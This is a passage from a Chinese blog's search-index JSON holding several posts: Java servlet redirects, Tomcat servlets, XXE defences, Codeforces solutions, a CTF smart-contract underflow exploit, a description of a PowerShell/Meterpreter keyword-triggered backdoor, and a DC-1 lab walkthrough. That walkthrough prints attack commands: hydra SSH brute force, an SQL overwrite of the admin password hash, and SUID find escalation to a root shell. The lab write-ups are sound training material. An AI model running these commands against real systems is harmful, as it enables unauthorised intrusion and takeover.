不带/重定向 假设重定向的方式为： response.sendRedirect(\"login.jsp\"); 那么重定向的路径为： http://localhost:8080/demo/control/login.jsp 相对当前请求路径转发。不符合期望。 URL地址重定向 假设重定向的方式为： response.sendRedirect(\"https://www.google.com/\"); 那么重定向的地址为： https://www.google.com/ 符合期望 统一格式化 可以定义一个方法来统一处理： public static void formatResponse(HttpServletRequest request, HttpServletResponse response, String target, String responseMethod) throws ServletException, IOException { switch (responseMethod) { case \"FORWARD\": { String url = (\"/\" + target).replaceAll(\"/+\", \"/\"); request.getRequestDispatcher(url).forward(request, response); } case \"REDIRECT\": { String url; if (target.startsWith(\"http\") || target.startsWith(\"www.\")) { url = target; } else { url = (\"/\" + request.getContextPath() + \"/\" + target).replaceAll(\"/+\", \"/\"); } response.sendRedirect(url); break; } default: { } } } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/categories/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"},{"name":"Java基础","slug":"Java基础","permalink":"https://functfan.github.io/tags/Java%E5%9F%BA%E7%A1%80/"},{"name":"框架基础","slug":"框架基础","permalink":"https://functfan.github.io/tags/%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80/"},{"name":"requestURI","slug":"requestURI","permalink":"https://functfan.github.io/tags/requestURI/"}]},{"title":"Tomcat的DefaultServlet和JspServlet（转载）","slug":"Tomcat的DefaultServlet和JspServlet（转载）","date":"2020-07-28T08:14:39.000Z","updated":"2020-07-28T08:18:53.353Z","comments":true,"path":"posts/3555085063/","link":"","permalink":"https://functfan.github.io/posts/3555085063/","excerpt":"","text":"版权声明：本文为CSDN博主「SouthWind0」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/SouthWind0/article/details/105147262 Tomcat的DefaultServlet和JspServlet Tomcat在/conf/web.xml中默认定义了两个Servlet，DefaultServlet和JspServlet。该web.xml对于所有tomcat加载的的web application都会应用，会和application本身的web.xml进行合并。 1.DefaultServlet DefaultServlet主要用于处理静态资源文件，如HTML，图片，CSS，JS等文件。 2. JspServlet 默认情况下，JspServlet主要负责处理所有的JSP文件请求，如：*.jsp,*.jspx。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/categories/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"},{"name":"Java基础","slug":"Java基础","permalink":"https://functfan.github.io/tags/Java%E5%9F%BA%E7%A1%80/"},{"name":"tomcat","slug":"tomcat","permalink":"https://functfan.github.io/tags/tomcat/"},{"name":"DefaultServletm","slug":"DefaultServletm","permalink":"https://functfan.github.io/tags/DefaultServletm/"},{"name":"JspServlet","slug":"JspServlet","permalink":"https://functfan.github.io/tags/JspServlet/"}]},{"title":"极客思路之1.使用网站关键字进行反弹shell","slug":"极客思路之1-使用网站关键字进行反弹shell","date":"2020-07-07T21:30:43.000Z","updated":"2021-06-22T08:45:06.127Z","comments":true,"path":"posts/1714307411/","link":"","permalink":"https://functfan.github.io/posts/1714307411/","excerpt":"","text":"版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。本文链接：https://blog.csdn.net/shuteer_xu/article/details/104958443 Twitter大牛@MattGraeber和@ChrisCampbell介绍了一种使用网站关键字来触发系统中shellcode的技术。 这种技术的主要优点是shellcode直接从内存中执行，不容易被发现，通过注册表项实现持久化。 C2Code -PowerShell脚本如下: 当PowerShell脚本在目标主机上执行时，它将在网站上查找已经给出的特定关键字，如果关键字存在将执行有效负载 打开一个Meterpreter会话进行监听，成功反弹回来。 Matt Nelson还创建了一个Office宏，执行相同的技术，但是会另外创建一个注册表项，每次用户登录时执行C2Code PowerShell脚本，以保持持久性。 当用户打开Office文档时，宏将运行，并且执行托管在控制网站上的Invoke-ShellCode脚本。 Meterpreter监听时同样会建立连接： 这是一个很好的后门方式，没有引入任何新的东西或造成很大的动静，就可以完成一次交互。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://functfan.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"网站关键字,反弹shell","slug":"网站关键字-反弹shell","permalink":"https://functfan.github.io/tags/%E7%BD%91%E7%AB%99%E5%85%B3%E9%94%AE%E5%AD%97-%E5%8F%8D%E5%BC%B9shell/"}]},{"title":"Vulhub靶机DC1实战","slug":"Vulhub靶机DC1实战","date":"2020-07-07T09:17:48.000Z","updated":"2020-07-07T09:23:27.178Z","comments":true,"path":"posts/633281426/","link":"","permalink":"https://functfan.github.io/posts/633281426/","excerpt":"","text":"DC-1靶机介绍 英文翻译如下： DC-1是一个有目的建造的易受攻击实验室靶机，目的是在渗透测试领域获得经验。它是为初学者设计的一个挑战，但它的简单程度将取决于你的技能和知识，以及你的学习能力。要成功完成这一挑战，您需要具备Linux技能，熟悉Linux命令行，并具有基本渗透测试工具的经验，例如可以在Kali Linux或Parrot安全操作系统上找到的工具。有多种方法获得root权限，但是，我已经包括了一些标志，其中包含了初学者的线索。总共有五个flag，但最终目标是在根目录中查找和读取flag。您甚至不需要是root用户就可以做到这一点，但是，您将需要root用户特权。根据您的技能水平，您可以跳过查找这些标志，直接查找root。初学者可能会遇到以前从未遇到过的挑战，但是要获得完成此挑战所需的信息，谷歌搜索就足够了。 渗透过程1.因为不知道root用户的密码，因此无法知道该机的IP地址，所以首先要做的就是知道这台机器的IP地址才能够更好的进行渗透，拿到flag因为该机器与我们的攻击机kali属于同一局域网，因此使用下面的命令来扫描存活的机器： 1arp-scan -l 通过扫描我们可以知道这台机器的IP地址为：192.168.64.1382.正常情况下下一步就是信息收集，我们这里因为不是实际环境，因此略过此步骤。进行端口扫描，使用nmap命令来扫描开放端口： 1nmap -sV -p- 192.168.64.138 3.发现80端口开放，访问可看到该框架基于Drupal 4.使用kali中的msfconsole查找该框架的漏洞并进行利用 成功拿到第一个flag,根据得到的flag思路，需要到一个配置文件 5.查找该配置文件，网上查找得知该配置文件默认路劲为：sites/default/settings.php 此处可以发现flag2及数据库重要信息，提示使用已经有的密码文件？？？ 尝试连接数据库，未果。 6.既然无法使用数据库密码进行连接，就要另寻思路，一般linux系统下，用户名及口令都是存放于/etc/passwd , /etc/shadow下查看passwd内容如下，我们意外发现了Flag4用户 为此我们就要通过使用kali下的hydra对用户名密码进行爆破，以求能够取得不错的效果爆破还需要john的配合通过下面的命令获取john 1234下载：wget http://www.openwall.com/john/j/john-1.8.0.tar.gz解压：tar -xvf john-1.8.0.tar.gz进入src目录：cd john-1.8.0 &amp;&amp; cd srcmake:选择自己当前的操作系统 然后就可以爆破了使用hydra+john进行爆破密码 1hydra -l flag4 -P run/password.lst ssh://192.168.64.138 使用ssh远程登录flag4 7.使用得到的数据库密码进行连接，看看能否有收获 得到drupaldb下user表中的数据 可见此用户即为web的登录用户，我们尝试修改其密码为password 1update users set pass=\"$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4\" where uid=1; web登录admin-password,登陆成功 8.根据上面的提示发现perm，是让我们通过suid提权，SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。suid提权的详细介绍连接如下https://blog.csdn.net/qq_36119192/article/details/84872644在这里经过测试发现可以使用find,命令如下 1find / -type f -perm -u=s 2&gt;/dev/null 我们创建一个文件，然后通过find命令查找，然后进行提权操作 123456~$ touch getflag~$ find / -type f -name getflag -exec \"whoami\" \\;root~$ find / -type f -name getflag -exec \"/bin/sh\" \\;# ls(成功提权) 获取root权限之后，进入root根目录即可看到flag5 渗透总结 经过这次渗透，熟悉了从基本信息收集到kali metaploit工具使用，之后通过密码爆破得到普通权限用户，最后利用SUID提权拿到root权限的整个思路，渗透完成之后就感觉特别的爽，学到了很多的技巧，希望能够将这些技巧融会贯通，熟练应用，做到心中有数。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://functfan.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://functfan.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"vulhub","slug":"vulhub","permalink":"https://functfan.github.io/tags/vulhub/"},{"name":"dc-1","slug":"dc-1","permalink":"https://functfan.github.io/tags/dc-1/"},{"name":"靶机实战","slug":"靶机实战","permalink":"https://functfan.github.io/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/"}]},{"title":"全国大学生信息安全竞赛2019CTF","slug":"全国大学生信息安全竞赛2019CTF","date":"2020-06-28T08:36:57.000Z","updated":"2020-07-03T09:21:36.800Z","comments":true,"path":"posts/3073343310/","link":"","permalink":"https://functfan.github.io/posts/3073343310/","excerpt":"","text":"题目地址：0x455541c3e9179a6cd8C418142855d894e11A288c@ropsten 1.仍然先从给的源码看有用信息。 又是balanceOf&gt;=10000，要很多的钱。 0x00为balanceOf，0x01为gift，0x02为owner地址。此时源码没有更多有价值信息，开始审计逆向出来的代码。接下来分析每一个函数。 2.func_01DC() 未解析出名字的函数，逻辑就是gift=0时，则balanceOf+1，且gift置为1。即空投函数。 3.profit() profit函数，逻辑就是balanceOf和gift都必须为1，则balanceOf+1，且gift置为2。 4.transfer(var arg0, var arg1) 从函数名就能看出来是转账函数，且易知arg0为收款账户，arg1位转账金额。大致逻辑如下。首先要求arg1不能&lt;=1，balanceOf也不能&lt;=1，arg1要&lt;=balanceof，然后就是标准转账函数，当前账户-arg1，收款账户+arg1。 5.transfer2(var arg0, var arg1) 最后一个函数，看函数名也是一个转账函数，也且易知arg0为收款账户，arg1位转账金额。但肯定有所区别。大致逻辑如下。首先要求arg1不能&lt;=2，balanceOf不能&lt;=2，balanceOf-arg1不能&lt;=0，然后就是标准转账函数，当前账户-arg1，收款账户+arg1。这个transfer2函数与上一个函数的重要区别就在于balanceOf-arg1不能&lt;=0这一步判断不同。其实二者在storage[temp0] = storage[temp0] - temp1;这一步的当前账户减arg1都有整数下溢漏洞。而transfer的判断是arg1和balanceOf直接比大小，而transfer2里是用二者相减再比大小那么如果设置arg1比较大，又由于balanceOf为uint型，所以减完balanceOf-arg1会是一个非常大的数，显然会大于0。这里即漏洞利用点。虽然transfer2还有余额大于2的要求，但是通过上面的transfer就可以实现 6.漏洞利用过程 所以先准备两个钱包地址（Addr1和Addr2） 然后两个地址都执行一遍func_01DC()和profit()，这样两个地址的balanceOf都为2，且gift也为2 用Addr1调用transfer函数向Addr2转账2，此时Addr1余额为0，Addr2余额为4 之后Addr2调用transfer2函数向Addr1转一个非常大的金额即可。此时两个地址的balanceOf都会非常大，Addr2是因为余额减法下溢造成，Addr1是因为转账数额下溢造成。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"2019CTF","slug":"2019CTF","permalink":"https://functfan.github.io/categories/2019CTF/"}],"tags":[{"name":"全面大学生信息安全竞赛","slug":"全面大学生信息安全竞赛","permalink":"https://functfan.github.io/tags/%E5%85%A8%E9%9D%A2%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"},{"name":"2019CTF","slug":"2019CTF","permalink":"https://functfan.github.io/tags/2019CTF/"}]},{"title":"致敬英雄共悼逝者逝者安息生者永念","slug":"致敬英雄共悼逝者逝者安息生者永念","date":"2020-06-24T13:26:11.000Z","updated":"2021-06-23T09:06:15.846Z","comments":true,"path":"posts/3176996243/","link":"","permalink":"https://functfan.github.io/posts/3176996243/","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"致敬英雄","slug":"致敬英雄","permalink":"https://functfan.github.io/categories/%E8%87%B4%E6%95%AC%E8%8B%B1%E9%9B%84/"}],"tags":[{"name":"2020年4月4日","slug":"2020年4月4日","permalink":"https://functfan.github.io/tags/2020%E5%B9%B44%E6%9C%884%E6%97%A5/"},{"name":"清明节","slug":"清明节","permalink":"https://functfan.github.io/tags/%E6%B8%85%E6%98%8E%E8%8A%82/"},{"name":"全国哀悼日","slug":"全国哀悼日","permalink":"https://functfan.github.io/tags/%E5%85%A8%E5%9B%BD%E5%93%80%E6%82%BC%E6%97%A5/"},{"name":"新冠肺炎","slug":"新冠肺炎","permalink":"https://functfan.github.io/tags/%E6%96%B0%E5%86%A0%E8%82%BA%E7%82%8E/"}]},{"title":"JAVA常见的XXE漏洞写法和防御转载","slug":"JAVA常见的XXE漏洞写法和防御转载","date":"2020-06-19T07:43:51.000Z","updated":"2020-06-24T02:23:21.773Z","comments":true,"path":"posts/2294213728/","link":"","permalink":"https://functfan.github.io/posts/2294213728/","excerpt":"","text":"版权声明：本文为博主「Spoock」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：[Spoock's Blog | JAVA常见的XXE漏洞写法和防御](http://blog.spoock.com/2018/10/23/java-xxe/) ### 1.漏洞本质 本质上xxe的漏洞都是因为对xml解析时允许引用外部实体，从而导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。 2.主要内容2.1 主要漏洞及原因 apache OFBiz中的XML解析是由UtilXml.java中readXmlDocument()完成，DocumentBuilderFactory设置不当，OFBiz为开源电子商务平台； JavaMelody中是由PayloadNameRequestWrapper.java中的parseSoapMethodName来解析XML，XMLStreamReader没有限制外部查询，JavaMelody属于java应用程序监控； 微信支付SDK的XXE漏洞和Spring-data-XMLBean XXE漏洞都是是使用了DocumentBuilderFactory没有限制外部查询而导致XXE。 2.2 具体类库正确使用方法DocumentBuilderFactory：注意代码先后顺序。DocumentBuilder builder = dbf.newDocumentBuilder();这行代码需要在dbf.setFeature()之后才能够生效； 12345678910111213141516171819DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();String FEATURE = null;FEATURE = \"http://javax.xml.XMLConstants/feature/secure-processing\";dbf.setFeature(FEATURE, true);FEATURE = \"http://apache.org/xml/features/disallow-doctype-decl\";dbf.setFeature(FEATURE, true);FEATURE = \"http://xml.org/sax/features/external-parameter-entities\";dbf.setFeature(FEATURE, false);FEATURE = \"http://xml.org/sax/features/external-general-entities\";dbf.setFeature(FEATURE, false);FEATURE = \"http://apache.org/xml/features/nonvalidating/load-external-dtd\";dbf.setFeature(FEATURE, false);dbf.setXIncludeAware(false);dbf.setExpandEntityReferences(false);DocumentBuilder builder = dbf.newDocumentBuilder();// 读取xml文件内容FileInputStream fis = new FileInputStream(\"path/to/xxexml\");InputSource is = new InputSource(fis);Document doc = builder.parse(is); SAXBuilder：默认设置存在XXE，需要在新建实例的时候加上true参数：SAXBuilder builder = new SAXBuilder(true);或者： 123456SAXBuilder builder = new SAXBuilder();builder.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);builder.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);builder.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);builder.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);Document doc = builder.build(InputSource); SAXParserFactory：默认存在问题，需要先setFeature，正确如下： 1234567SAXParserFactory spf = SAXParserFactory.newInstance();spf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);spf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);spf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);spf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);SAXParser parser = spf.newSAXParser();parser.parse(InputSource, (HandlerBase) null); SAXReader：同上，先设置setFeature。正确如下： 123456SAXReader saxReader = new SAXReader();saxReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);saxReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);saxReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);saxReader.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);saxReader.read(InputSource); SAXTransformerFactory：默认存在XXE。虽然在运行时会报错，当时仍然能够触发XXE，正确如下： 12345SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\");StreamSource source = new StreamSource(InputSource);sf.newTransformerHandler(source); SchemaFactory：默认会存在XXE。虽然在运行时会报错，当时仍然能够触发XXE，正确如下： 12345SchemaFactory factory = SchemaFactory.newInstance(\"http://www.w3.org/2001/XMLSchema\");factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");StreamSource source = new StreamSource(InputSource);Schema schema = factory.newSchema(source); TransformerFactory：默认解析存在XXE。正确如下： 12345TransformerFactory tf = TransformerFactory.newInstance();tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\");StreamSource source = new StreamSourceInputSource);tf.newTransformer().transform(source, new DOMResult()); ValidatorSample：使用默认解析的方法会存在XXE。正确如下： 1234567SchemaFactory factory = SchemaFactory.newInstance(\"http://www.w3.org/2001/XMLSchema\");Schema schema = factory.newSchema();Validator validator = schema.newValidator();validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");StreamSource source = new StreamSource(InputSource);validator.validate(source); XMLReader：使用默认的方式存在XXE。正确如下： 123456XMLReader reader = XMLReaderFactory.createXMLReader();reader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);reader.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);reader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);reader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);reader.parse(new InputSource(InputSource)); Unmarshaller：使用默认方式不会出现问题。（唯一不会出现问题的XML解析库） 12345Class tClass = Some.class;JAXBContext context = JAXBContext.newInstance(tClass);Unmarshaller um = context.createUnmarshaller();Object o = um.unmarshal(ResourceUtils.getPoc1());tClass.cast(o); 2.2 正确方法总结第一种： 1234\"http://apache.org/xml/features/disallow-doctype-decl\", true\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false\"http://xml.org/sax/features/external-general-entities\", false\"http://xml.org/sax/features/external-parameter-entities\", false 第二种： 12XMLConstants.ACCESS_EXTERNAL_DTD, \"\"XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\" 3.参考文献 JAVA常见的XXE漏洞写法和防御 https://blog.spoock.com/2018/10/23/java-xxe/ Java服务XXE漏洞防御方法 http://www.leadroyal.cn/?p=562 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://functfan.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"}],"tags":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"},{"name":"Java基础","slug":"Java基础","permalink":"https://functfan.github.io/tags/Java%E5%9F%BA%E7%A1%80/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://functfan.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"XXE漏洞","slug":"XXE漏洞","permalink":"https://functfan.github.io/tags/XXE%E6%BC%8F%E6%B4%9E/"}]},{"title":"Codeforces164ECompatibleNumbers","slug":"Codeforces164ECompatibleNumbers","date":"2020-06-19T07:28:35.000Z","updated":"2020-06-24T02:22:36.895Z","comments":true,"path":"posts/2626195267/","link":"","permalink":"https://functfan.github.io/posts/2626195267/","excerpt":"","text":"版权声明：本文为CSDN博主「Bjut_Search2016」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/nyist_zxp/article/details/40020349 题目链接~~&gt; 做题感悟：确实是好题，做拉的比赛的时候想了很久，想到枚举变幻某一位的 0 为 1 ，但是每个数都这样枚举岂不超时的节奏，当时没想到其实从大到小枚举一次就 ok 了。 解题思路： 本题要求两个数 a &amp; b = 0 , 如果 a = 10010 , b 至少（指在 a 中的为 1 的位必须为 0 ）是 01101 ，还可以是 00101 ，00001 ，00000。就相当于你去买东西一样，先提出你的要求（必须满足），至于其他方面都无所谓。这样我们可以枚举 b 中的 1 ，让其变为 0 ，那么，怎样枚举呢 ？ 一个一个的枚举是不可以的，肯定超时，我们可以统一枚举一下，就跟状态压缩更新状态一样，相当于递推，用动态规划的思想去优化它，每个数最多只变化 0 的个数，然后再用变化了的数去变化。 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include&lt;iostream&gt;#include&lt;sstream&gt;#include&lt;map&gt;#include&lt;cmath&gt;#include&lt;fstream&gt;#include&lt;queue&gt;#include&lt;vector&gt;#include&lt;sstream&gt;#include&lt;cstring&gt;#include&lt;cstdio&gt;#include&lt;stack&gt;#include&lt;bitset&gt;#include&lt;ctime&gt;#include&lt;string&gt;#include&lt;cctype&gt;#include&lt;iomanip&gt;#include&lt;algorithm&gt;using namespace std ;#define INT __int64#define L(x) (x * 2)#define R(x) (x * 2 + 1)const int INF = 0x3f3f3f3f ;const double esp = 0.0000000001 ; const double PI = acos(-1.0) ;const INT mod = 1e9 + 7 ;const int MY = 15 ;const int MX = (1&lt;&lt;22) + 5 ;int n ;int dp[MX] ,g[MX] ;int main(){ //freopen(\"input.txt\" ,\"r\" ,stdin) ; while(~scanf(\"%d\" ,&amp;n)) { int S = (1&lt;&lt;22) - 1 ; memset(dp ,0 ,sizeof(dp)) ; for(int i = 0 ;i &lt; n ; ++i) { scanf(\"%d\" ,&amp;g[i]) ; dp[g[i]^S] = g[i] ; // g[I] 需要的另一半 } for(int i = S ; i &gt;= 0 ; --i) // 枚举各种状态 { if(!dp[i]) // 如果没有存值 { for(int j = 0 ;j &lt; 22 ; ++j) // 给其添加 1 让其变成有值 if(dp[i|(1&lt;&lt;j)]) dp[i] = dp[i|(1&lt;&lt;j)] ; } } for(int i = 0 ;i &lt; n ; ++i) { if(i) cout&lt;&lt;\" \" ; if(dp[g[i]]) cout&lt;&lt;dp[g[i]] ; else cout&lt;&lt;\"-1\" ; } cout&lt;&lt;endl ; } return 0 ;} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/categories/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"},{"name":"ACM算法","slug":"ACM算法","permalink":"https://functfan.github.io/tags/ACM%E7%AE%97%E6%B3%95/"},{"name":"Codeforces164","slug":"Codeforces164","permalink":"https://functfan.github.io/tags/Codeforces164/"},{"name":"Bjut_Search2016","slug":"Bjut-Search2016","permalink":"https://functfan.github.io/tags/Bjut-Search2016/"}]},{"title":"Codeforces385CBearandPrimeNumbers","slug":"Codeforces385CBearandPrimeNumbers","date":"2020-06-19T07:23:13.000Z","updated":"2020-06-24T02:22:52.808Z","comments":true,"path":"posts/1795814039/","link":"","permalink":"https://functfan.github.io/posts/1795814039/","excerpt":"","text":"版权声明：本文为CSDN博主「Bjut_Search2016」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/nyist_zxp/article/details/40020349 题目链接~~&gt; 做题感悟：这题属于想法题，比赛时直接做的 D 题，但是处理坐标处理的头晕眼花的，结果到最后也没AC。 解题思路： 因为查询的时候只考虑素数，so~我们只考虑素数就可以，这就需要筛素数，我们可以在筛素数的同时把某个素数出现的倍数加上，输入的时候只要记录某个数的个数就可以了。 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include&lt;iostream&gt;#include&lt;sstream&gt;#include&lt;map&gt;#include&lt;cmath&gt;#include&lt;fstream&gt;#include&lt;queue&gt;#include&lt;vector&gt;#include&lt;sstream&gt;#include&lt;cstring&gt;#include&lt;cstdio&gt;#include&lt;stack&gt;#include&lt;bitset&gt;#include&lt;ctime&gt;#include&lt;string&gt;#include&lt;iomanip&gt;#include&lt;algorithm&gt;using namespace std ;#define INT long long intconst int INF = 0x3f3f3f ;const double esp = 0.0000000001 ;const double PI = acos(-1.0) ;const int mod = 1000000007 ;const int MY = 100 + 5 ;const int MX = 10000000 + 5 ;int Max ,n ,m ;bool isprime[MX] ;int sum[MX] ,num[MX] ;void init() // 筛法同时记录个数{ memset(isprime ,false ,sizeof(isprime)) ; memset(sum ,0 ,sizeof(sum)) ; for(int i = 2 ;i &lt;= Max ; ++i) { sum[i] += sum[i-1] ; if(!isprime[i]) { sum[i] += num[i] ; for(int j = i + i ;j &lt;= Max ; j += i) { sum[i] += num[j] ; isprime[j] = true ; } } }}int main(){ int x ; while(~scanf(\"%d\" ,&amp;n)) { memset(num ,0 ,sizeof(num)) ; Max = 0 ; for(int i = 0 ;i &lt; n ; ++i) { scanf(\"%d\" ,&amp;x) ; num[x]++ ; // 记录个数 Max = max(Max ,x) ; } init() ; scanf(\"%d\" ,&amp;m) ; int le ,rt ; for(int i = 0 ;i &lt; m ; ++i) { scanf(\"%d%d\" ,&amp;le ,&amp;rt) ; if(rt &gt; Max) rt = Max ; if(le &gt; Max) cout&lt;&lt;\"0\"&lt;&lt;endl ; else cout&lt;&lt;sum[rt]-sum[le-1]&lt;&lt;endl ; } } return 0 ;} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); 